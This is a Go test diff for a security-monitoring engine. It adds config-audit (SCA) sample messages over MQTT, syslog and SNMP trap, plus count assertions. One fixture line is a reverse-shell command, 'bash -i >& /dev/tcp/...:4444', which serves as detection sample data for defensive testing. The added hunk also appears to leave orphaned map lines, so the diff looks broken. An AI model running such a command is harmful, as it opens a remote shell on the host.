@@ -109,15 +109,38 @@ func TestEngine_ProcessSyslog(t *testing.T) {
 		t.Errorf("expected 1 winEventID entity, got %d", len(winData))
 	}
 
-	// 7. twagentneo MQTT (metrics, alert, fim, tcp)
+	// 7. twagentneo MQTT (metrics, alert, fim, sca, tcp)
 	engine.ProcessMQTTMsg("agent-01", "10.0.0.55", "twsnmpneo/agent/agent-01/metrics", []byte(`{"agent_id":"agent-01","hostname":"agent-host-01","os":"linux","version":"v1.2.0","ip":"10.0.0.55","mac":"00:11:22:33:44:55","cpu_percent":35.5,"mem_percent":62.1,"disk_used_percent":48.0,"rx_mbps":10.2,"tx_mbps":3.4}`))
 	engine.ProcessMQTTMsg("agent-01", "10.0.0.55", "twsnmpneo/agent/agent-01/alert", []byte(`{"timestamp":"2026-10-25T05:00:00Z","agent_id":"agent-01","hostname":"agent-host-01","level":"HIGH","category":"security","rule_title":"Reverse Shell","source_log":"bash -i >& /dev/tcp/198.51.100.10/4444","ai_judgment":{"is_threat":true,"confidence":0.96,"summary_ja":"リバースシェル検知","recommended_action_ja":"プロセス停止と隔離","compliance_violated":true,"compliance":["PCI-DSS","CIS"]}}`))
 	engine.ProcessMQTTMsg("agent-01", "10.0.0.55", "twsnmpneo/agent/agent-01/fim", []byte(`{"timestamp":"2026-10-25T05:00:01Z","agent_id":"agent-01","hostname":"agent-host-01","level":"MEDIUM","category":"fim","rule_title":"FIM: WRITE /etc/passwd","source_log":"path=/etc/passwd op=WRITE hash=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"}`))
+	engine.ProcessMQTTMsg("agent-01", "10.0.0.55", "twsnmpneo/agent/agent-01/sca", []byte(`{"timestamp":"2026-10-25T05:00:02Z","agent_id":"agent-01","hostname":"agent-host-01","rule_id":"CIS-3.14","title":"World-Writable File","severity":"high","file_path":"/etc/cron.d/job","proof":"Permissions: 0666","remediation":"chmod 0644 /etc/cron.d/job","compliance":["CIS","CIS-3.14"],"ai_judge":{"is_threat":true,"confidence":0.9,"summary_ja":"危険なパーミッション","action_ja":"パーミッション修正"}}`))
 	engine.ProcessMQTTMsg("agent-01", "10.0.0.55", "twsnmpneo/agent/agent-01/tcp", []byte(`[{"remote_ip":"8.8.8.8","process":"curl","services":["https"],"count":2}]`))
 
 	// 8. twagentneo RFC 5424 Syslog
 	engine.ProcessSyslog(map[string]interface{}{
 		"app_name":        "twagentneo",
+		"hostname":        "agent-host-01",
+		"structured_data": `[twsnmpneo@17862 rule="Brute Force SSH" threat="YES" comp="NO"]`,
+		"message":         "AI Summary: SSH brute force attempt",
+		"severity":        3,
+		"timestamp":       now,
+	})
+	engine.ProcessSyslog(map[string]interface{}{
+		"app_name":        "twagentneo-sca",
+		"hostname":        "agent-host-01",
+		"structured_data": `[twsnmpneo@17862 rule="CIS-4.7: Leftover File" threat="NO" comp="YES"]`,
+		"message":         "Configuration Audit: /tmp/test.bak",
+		"severity":        4,
+		"timestamp":       now,
+	})
+
+	// 9. twagentneo SNMP Trap
+	engine.ProcessTrap(map[string]interface{}{
+		"Time":        now.UnixNano(),
+		"FromAddress": "10.0.0.55(agent-host-01)",
+		"TrapType":    "twagentNeoSCAAlert",
+		"Variables":   "twagentNeoHostname.0=agent-host-01, twagentNeoTrapSeverity.0=HIGH, twagentNeoTrapCategory.0=Configuration Audit, twagentNeoTrapRuleTitle.0=CIS-4.1: SSH Root Login Enabled, twagentNeoTrapSourceLog.0=/etc/ssh/sshd_config",
+	})
 		"hostname":        "agent-host-01",
 		"structured_data": `[twsnmpneo@17862 rule="Brute Force SSH" threat="YES" comp="NO"]`,
 		"message":         "AI Summary: SSH brute force attempt",
@@ -156,6 +179,10 @@ func TestEngine_ProcessSyslog(t *testing.T) {
 	agentFIM, err := store.ListLogReportData(ctx, KindTwAgentFIM)
 	if err != nil || len(agentFIM) < 2 {
 		t.Fatalf("expected >= 2 twAgentFIM entities, got %d (err: %v)", len(agentFIM), err)
+	}
+	agentSCA, err := store.ListLogReportData(ctx, KindTwAgentSCA)
+	if err != nil || len(agentSCA) < 3 {
+		t.Fatalf("expected >= 3 twAgentSCA entities, got %d (err: %v)", len(agentSCA), err)
 	}
 	// Verify that /etc/passwd merged both "mqtt" and "syslog" protocols
 	foundPasswdMerged := false
